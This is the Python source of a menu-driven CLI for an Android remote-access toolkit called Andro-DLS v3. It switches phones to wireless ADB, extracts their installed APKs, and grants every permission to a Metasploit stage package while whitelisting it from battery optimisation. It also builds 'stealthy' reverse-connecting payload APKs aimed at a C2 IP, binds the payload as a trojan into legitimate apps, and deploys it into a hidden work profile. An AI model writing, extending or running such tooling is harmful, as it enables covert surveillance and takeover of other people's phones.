"""Andro-DLS v3 — CLI with Watchdogs-inspired UI."""

from __future__ import annotations

import os
import shutil
import subprocess
import json
import random
import time
import sys
from pathlib import Path
from datetime import datetime

from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.table import Table
from rich.live import Live
from rich.text import Text
from rich.layout import Layout
from rich.columns import Columns

from modules import banner, color
from modules.console import console, ask, confirm, adb, print_error, print_success, print_warning
from modules.config import AppConfig
from modules.tools import resolve_external_tools
from modules.console import set_adb_executable


def _project_root() -> Path:
    return Path(__file__).resolve().parent.parent


# ─── UI Helpers ────────────────────────────────────────────────────────────

def check_adb(config: AppConfig) -> bool:
    """Check if ADB is available."""
    if shutil.which("adb"):
        config.adb_path = "adb"
        return True
    if config.adb_path and Path(config.adb_path).is_file():
        return True
    console.print(Panel("[red]ADB not found.[/red]\n[dim]Run: bash install.sh --yes[/dim]", title="ERROR", border_style="red"))
    return False


# ─── Device Store ──────────────────────────────────────────────────────────

DEVICES_FILE = ".payload-build/devices.json"


def save_device(serial, name="", ip="", last_seen=""):
    root = _project_root()
    path = root / DEVICES_FILE
    path.parent.mkdir(parents=True, exist_ok=True)
    devices = []
    if path.exists():
        try:
            devices = json.loads(path.read_text())
        except Exception:
            devices = []
    for d in devices:
        if d.get("serial") == serial:
            d["name"] = name or d.get("name", "")
            d["ip"] = ip or d.get("ip", "")
            d["last_seen"] = last_seen or datetime.now().strftime("%Y-%m-%d %H:%M")
            path.write_text(json.dumps(devices, indent=2))
            return
    devices.append({"serial": serial, "name": name, "ip": ip, "last_seen": last_seen or datetime.now().strftime("%Y-%m-%d %H:%M")})
    path.write_text(json.dumps(devices, indent=2))


def load_devices():
    root = _project_root()
    path = root / DEVICES_FILE
    if path.exists():
        try:
            return json.loads(path.read_text())
        except Exception:
            return []
    return []


# ─── Status Bar (Watchdogs-style) ──────────────────────────────────────────

def get_status_bar():
    now = datetime.now().strftime("%H:%M:%S")
    devices = load_devices()
    live_count = 0
    out, _ = adb("devices")
    if out:
        live_count = len([l for l in out.split("\n")[1:] if "device" in l and "offline" not in l])
    return f"[dim]ctB {now}[/dim] │ [cyan]{live_count}[/cyan] live │ [dim]{len(devices)}[/dim] saved"


# ── Animated Loading ──────────────────────────────────────────────────────

def run_with_spinner(text, func, *args, **kwargs):
    with Progress(SpinnerColumn(), TextColumn("[cyan]{task.description}[/cyan]"), transient=True) as progress:
        task = progress.add_task(text, total=None)
        result = func(*args, **kwargs)
        progress.update(task, completed=True)
        return result


# ─── USB Setup ─────────────────────────────────────────────────────────────

def usb_setup(config: AppConfig):
    console.print(Panel("[bold green]USB → WIRELESS SETUP[/bold green]\n\n[dim]Switch phone to wireless ADB. Remove cable after.[/dim]", title="STEP 1", border_style="green"))
    if not check_adb(config):
        return
    out, rc = adb("devices")
    lines = out.strip().split("\n")[1:]
    usb_devices = [l.split()[0] for l in lines if "device" in l and "offline" not in l]
    if not usb_devices:
        console.print("\n[yellow]No USB device.[/yellow]")
        console.print("\n[dim]1. Connect phone via USB[/dim]")
        console.print("[dim]2. Settings → About Phone → Tap 'Build Number' 7x[/dim]")
        console.print("[dim]3. Settings → Developer Options → USB Debugging ON[/dim]")
        return
    device = usb_devices[0]
    model, _ = adb("-s", device, "shell", "getprop", "ro.product.model")
    android, _ = adb("-s", device, "shell", "getprop", "ro.build.version.release")
    console.print(f"\n[cyan]●[/cyan] {model} · Android {android}")
    if not confirm("\nSwitch to wireless?"):
        return
    out, rc = adb("-s", device, "tcpip", "5555")
    if rc != 0:
        print_error(f"tcpip failed: {out}")
        return
    console.print(f"[green]✓[/green] {out.strip()}")
    time.sleep(3)
    ip_out, _ = adb("-s", device, "shell", "ip", "-f", "inet", "addr", "show", "wlan0")
    ip = ""
    for line in ip_out.split("\n"):
        if "inet " in line:
            for p in line.strip().split():
                if p.startswith(("192.168.", "10.", "172.")):
                    ip = p.split("/")[0]
                    break
    if not ip:
        ip = ask("[cyan]Phone IP[/cyan] > ").strip()
    out, rc = adb("connect", f"{ip}:5555")
    if "connected" in out.lower():
        name = ask("\n[cyan]Device name[/cyan] > ").strip() or "Unknown"
        save_device(serial=f"{ip}:5555", name=name, ip=ip)
        console.print(f"\n[bold green]✓[/bold green] [cyan]{name}[/cyan] @ {ip}:5555")
    else:
        print_warning(f"Try: adb connect {ip}:5555")


# ─── Connected Devices ─────────────────────────────────────────────────────

def list_devices(config: AppConfig):
    out, rc = adb("devices")
    live = [l.split()[0] for l in out.strip().split("\n")[1:] if "device" in l and "offline" not in l]
    devices = load_devices()
    table = Table(title="[cyan]DEVICES[/cyan]", border_style="cyan")
    table.add_column("STATUS", style="bold")
    table.add_column("NAME", style="white")
    table.add_column("SERIAL", style="dim")
    table.add_column("IP", style="dim")
    table.add_column("LAST SEEN", style="dim")
    for d in devices:
        status = "[green]●[/green]" if d.get("serial") in live else "[red]○[/red]"
        model = ""
        if d.get("serial") in live:
            model, _ = adb("-s", d["serial"], "shell", "getprop", "ro.product.model", timeout=5)
        table.add_row(status, f"{d.get('name', 'Unknown')} {model}", d.get("serial", "?"), d.get("ip", "—"), d.get("last_seen", "?"))
    if not devices:
        console.print("[yellow]No saved devices.[/yellow]")
    else:
        console.print(table)


def connect_device(config: AppConfig):
    devices = load_devices()
    if not devices:
        console.print("[yellow]No saved devices.[/yellow]")
        return
    table = Table(border_style="cyan")
    table.add_column("#", style="dim")
    table.add_column("NAME", style="white")
    table.add_column("IP", style="cyan")
    for i, d in enumerate(devices, 1):
        table.add_row(str(i), d.get("name", "?"), d.get("ip", "?"))
    console.print(table)
    choice = ask("\n[cyan]Device[/cyan] > ").strip()
    if not choice.isdigit() or int(choice) < 1 or int(choice) > len(devices):
        print_error("Invalid")
        return
    d = devices[int(choice) - 1]
    ip = d.get("ip", "")
    if not ip:
        print_error("No IP")
        return
    out, rc = adb("connect", f"{ip}:5555")
    if "connected" in out.lower():
        console.print(f"[green]✓[/green] {d.get('name')}")
        save_device(serial=f"{ip}:5555", name=d.get("name"), ip=ip)


def reconnect_last(config: AppConfig):
    devices = load_devices()
    if not devices:
        console.print("[yellow]No saved devices.[/yellow]")
        return
    last = devices[-1]
    ip = last.get("ip", "")
    if not ip:
        print_error("No IP")
        return
    out, rc = adb("connect", f"{ip}:5555")
    if "connected" in out.lower():
        console.print(f"[green]✓[/green] {last.get('name')}")
    else:
        print_warning("Failed")


def device_info(config: AppConfig):
    out, rc = adb("devices")
    live = [l.split()[0] for l in out.strip().split("\n")[1:] if "device" in l and "offline" not in l]
    if not live:
        console.print("[yellow]No devices.[/yellow]")
        return
    serial = live[0]
    if len(live) > 1:
        console.print("[cyan]Multiple:[/cyan]")
        for i, d in enumerate(live, 1):
            console.print(f"  {i}. {d}")
        choice = ask("\n[cyan]Which[/cyan] > ").strip()
        if choice.isdigit() and 1 <= int(choice) <= len(live):
            serial = live[int(choice) - 1]
    props = [("Model", "ro.product.model"), ("Android", "ro.build.version.release"), ("API", "ro.build.version.sdk"), ("CPU", "ro.product.cpu.abi")]
    table = Table(border_style="cyan")
    table.add_column("PROPERTY", style="white")
    table.add_column("VALUE", style="cyan")
    for label, prop in props:
        val, _ = adb("-s", serial, "shell", "getprop", prop, timeout=5)
        table.add_row(label, val or "N/A")
    bat_out, _ = adb("-s", serial, "shell", "dumpsys", "battery", timeout=5)
    for line in bat_out.split("\n"):
        if "level:" in line:
            table.add_row("Battery", line.split(":")[1].strip() + "%")
            break
    console.print(table)


def pull_apks(config: AppConfig):
    console.print(Panel("[bold cyan]APK EXTRACTOR[/bold cyan]\n[dim]Pulling all installed APKs...[/dim]", border_style="cyan"))
    if not check_adb(config):
        return
    out, rc = adb("devices")
    if rc != 0 or len([l for l in out.split("\n")[1:] if "device" in l]) == 0:
        console.print("[yellow]No device.[/yellow]")
        return
    from modules.usb_apk_extractor import run_extractor
    run_extractor()


def grant_permissions(config: AppConfig):
    console.print(Panel("[bold cyan]PERMISSIONS[/bold cyan]\n[dim]Granting all runtime permissions...[/dim]", border_style="cyan"))
    PKG = "com.metasploit.stage"
    out, rc = adb("devices")
    if rc != 0 or len([l for l in out.split("\n")[1:] if "device" in l]) == 0:
        console.print("[yellow]No device.[/yellow]")
        return
    from modules.usb_permissions import grant_permissions as gp
    count = gp(PKG, "all")
    if count > 0:
        adb("shell", "dumpsys", "deviceidle", "whitelist", f"+{PKG}")
        console.print(f"\n[green]✓[/green] {count} granted + whitelisted")


# ─── Build Agent ───────────────────────────────────────────────────────────

def build_pure(config: AppConfig):
    console.print(Panel("[bold magenta]PURE BUILD[/bold magenta]\n[dim]No msfvenom — stealthy[/dim]", border_style="magenta"))
    lhost = ask("[cyan]C2 IP[/cyan] > ").strip()
    lport = ask("[cyan]Port[/cyan] > ").strip() or "4445"
    if not lhost:
        print_error("IP required")
        return
    root = _project_root()
    out_path = root / "androdls-agent.apk"
    cmd = ["bash", str(root / "build_agent_pure.sh"), lhost, lport, str(out_path)]
    with Progress(SpinnerColumn(), TextColumn("[cyan]{task.description}[/cyan]"), transient=True) as progress:
        task = progress.add_task("Building...", total=None)
        r = subprocess.run(cmd, capture_output=True, text=True, cwd=str(root))
        progress.update(task, completed=True)
    print(r.stdout)
    if r.returncode == 0:
        print_success(f"Built: {out_path}")
    else:
        print(r.stderr)
        print_error("Failed")


def build_enhanced(config: AppConfig):
    console.print(Panel("[bold magenta]ENHANCED BUILD[/bold magenta]\n[dim]msfvenom + 6-layer[/dim]", border_style="magenta"))
    lhost = ask("[cyan]C2 IP[/cyan] > ").strip()
    lport = ask("[cyan]Port[/cyan] > ").strip() or "4445"
    if not lhost:
        print_error("IP required")
        return
    root = _project_root()
    out_path = root / "androdls-enhanced.apk"
    cmd = ["bash", str(root / "build_payload_enhanced.sh"), "--agent", "--camo", "--fgs", lhost, lport, str(out_path)]
    with Progress(SpinnerColumn(), TextColumn("[cyan]{task.description}[/cyan]"), transient=True) as progress:
        task = progress.add_task("Building...", total=None)
        r = subprocess.run(cmd, capture_output=True, text=True, cwd=str(root))
        progress.update(task, completed=True)
    print(r.stdout)
    if r.returncode == 0:
        print_success(f"Built: {out_path}")
    else:
        print(r.stderr)
        print_error("Failed")


def build_trojan(config: AppConfig):
    console.print(Panel("[bold magenta]TROJAN BIND[/bold magenta]\n[dim]Inject into legit APK[/dim]", border_style="magenta"))
    legit = ask("[cyan]APK path[/cyan] > ").strip()
    if not legit or not Path(legit).exists():
        print_error("APK not found")
        return
    lhost = ask("[cyan]C2 IP[/cyan] > ").strip()
    lport = ask("[cyan]Port[/cyan] > ").strip() or "4445"
    if not lhost:
        print_error("IP required")
        return
    root = _project_root()
    out_path = root / "trojan.apk"
    cmd = ["bash", str(root / "bind_payload.sh"), legit, lhost, lport, str(out_path)]
    with Progress(SpinnerColumn(), TextColumn("[cyan]{task.description}[/cyan]"), transient=True) as progress:
        task = progress.add_task("Building trojan...", total=None)
        r = subprocess.run(cmd, capture_output=True, text=True, cwd=str(root))
        progress.update(task, completed=True)
    print(r.stdout)
    if r.returncode == 0:
        print_success(f"Built: {out_path}")
    else:
        print(r.stderr)
        print_error("Failed")


def deploy_work_profile(config: AppConfig):
    console.print(Panel("[bold magenta]WORK PROFILE[/bold magenta]\n[dim]Hidden profile deploy[/dim]", border_style="magenta"))
    apk = ask("[cyan]APK path[/cyan] > ").strip()
    root = _project_root()
    if not apk:
        for name in ["androdls-agent.apk", "androdls-enhanced.apk"]:
            p = root / name
            if p.exists():
                apk = str(p)
                break
    if not apk or not Path(apk).exists():
        print_error("No APK")
        return
    from modules.work_profile import deploy
    deploy(apk)


def deploy_to_device(config: AppConfig):
    console.print(Panel("[bold magenta]DEPLOY[/bold magenta]\n[dim]Install + perms + launch[/dim]", border_style="magenta"))
    root = _project_root()
    apk = ask("[cyan]APK path[/cyan] > ").strip()
    if not apk:
        for name in ["androdls-agent.apk", "androdls-enhanced.apk", "payload_enhanced.apk"]:
            p = root / name
            if p.exists():
                apk = str(p)
                break
    if not apk or not Path(apk).exists():
        print_error("No APK")
        return
    cmd = ["bash", str(root / "deploy_agent.sh"), apk]
    with Progress(SpinnerColumn(), TextColumn("[cyan]{task.description}[/cyan]"), transient=True) as progress:
        task = progress.add_task("Deploying...", total=None)
        r = subprocess.run(cmd, capture_output=True, text=True, cwd=str(root))
        progress.update(task, completed=True)
    print(r.stdout)
    if r.returncode == 0:
        print_success("Deployed")
    else:
        print(r.stderr)
        print_error("Failed")


# ─── Main ──────────────────────────────────────────────────────────────────

_selected_banner = ""

def _pick_banner():
    return f"[bold {random.choice(color.color_list)}]{random.choice(banner.banner_list)}[/bold {random.choice(color.color_list)}]"


def display_menu(config: AppConfig, page=0):
    global _selected_banner
    console.print(_selected_banner)
    if page < len(banner.menu):
        console.print(banner.menu[page])
    console.print(f"\n[dim]{get_status_bar()}[/dim]")


def clear_screen(config: AppConfig, page=0):
    os.system(config.clear_cmd)
    display_menu(config, page)


def start(config: AppConfig) -> None:
    Path("Downloaded-Files").mkdir(exist_ok=True)
    resolve_external_tools(config)
    set_adb_executable(config.adb_path)


def handle_main_menu(config: AppConfig, option: str) -> str:
    match option:
        case "0":
            config.run = False
            console.print("\n[white]Exiting...[/white]\n")
            return "exit"
        case "1":
            usb_setup(config)
            return "main"
        case "2":
            return "devices"
        case "3":
            return "build"
        case _:
            console.print("\n[red]Invalid.[/red]\n")
            return "main"


def handle_devices_menu(config: AppConfig, option: str) -> str:
    match option:
        case "99" | "b":
            return "main"
        case "1":
            list_devices(config)
        case "2":
            connect_device(config)
        case "3":
            reconnect_last(config)
        case "4":
            device_info(config)
        case "5":
            pull_apks(config)
        case "6":
            grant_permissions(config)
        case _:
            console.print("\n[red]Invalid.[/red]\n")
    return "devices"


def handle_build_menu(config: AppConfig, option: str) -> str:
    match option:
        case "99" | "b":
            return "main"
        case "1":
            build_pure(config)
        case "2":
            build_enhanced(config)
        case "3":
            build_trojan(config)
        case "4":
            deploy_work_profile(config)
        case "5":
            deploy_to_device(config)
        case _:
            console.print("\n[red]Invalid.[/red]\n")
    return "build"


def main(config: AppConfig) -> None:
    current_page = "main"
    page_num = 0
    while config.run:
        try:
            clear_screen(config, page_num)
            option = ask(f"[red]\\[{current_page.upper()}][/red] > ").strip().lower()
            if current_page == "main":
                result = handle_main_menu(config, option)
                if result == "exit":
                    break
                elif result == "devices":
                    current_page = "devices"
                    page_num = 1
                elif result == "build":
                    current_page = "build"
                    page_num = 2
            elif current_page == "devices":
                result = handle_devices_menu(config, option)
                if result == "main":
                    current_page = "main"
                    page_num = 0
            elif current_page == "build":
                result = handle_build_menu(config, option)
                if result == "main":
                    current_page = "main"
                    page_num = 0
            if config.run:
                ask("\n[dim]Enter to continue...[/dim]")
        except (KeyboardInterrupt, EOFError):
            config.run = False
            console.print("\n[white]Exiting...[/white]\n")
        except Exception as e:
            console.print(f"\n[red]Error:[/red] {e}\n[yellow]Back to main.[/yellow]\n")
            current_page = "main"
            page_num = 0


def run() -> None:
    global _selected_banner
    config = AppConfig()
    start(config)
    _selected_banner = _pick_banner()
    clear_screen(config, 0)
    main(config)
